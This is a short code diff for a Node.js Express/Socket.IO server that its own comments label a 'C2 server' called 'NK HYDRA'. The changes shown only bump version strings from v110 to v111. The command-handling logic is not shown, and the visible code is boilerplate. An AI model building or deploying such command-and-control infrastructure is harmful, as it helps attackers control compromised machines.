@@ -1,3 +1,5 @@
+// TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
+// NK HYDRA v111.0 [OMNI BROADCAST]
 
 const express = require('express');
 const http = require('http');
@@ -7,7 +9,7 @@ const cors = require('cors');
 const app = express();
 app.use(cors());
 
-app.get('/', (req, res) => { res.send('HYDRA C2 v110.0 [OMNI BROADCAST]'); });
+app.get('/', (req, res) => { res.send('HYDRA C2 v111.0 [OMNI BROADCAST]'); });
 
 const server = http.createServer(app);
 const io = new Server(server, { 
@@ -86,5 +88,4 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`HYDRA v110 LISTENING ON ${PORT}`));
-
+server.listen(PORT, () => console.log(`HYDRA v111 LISTENING ON ${PORT}`));
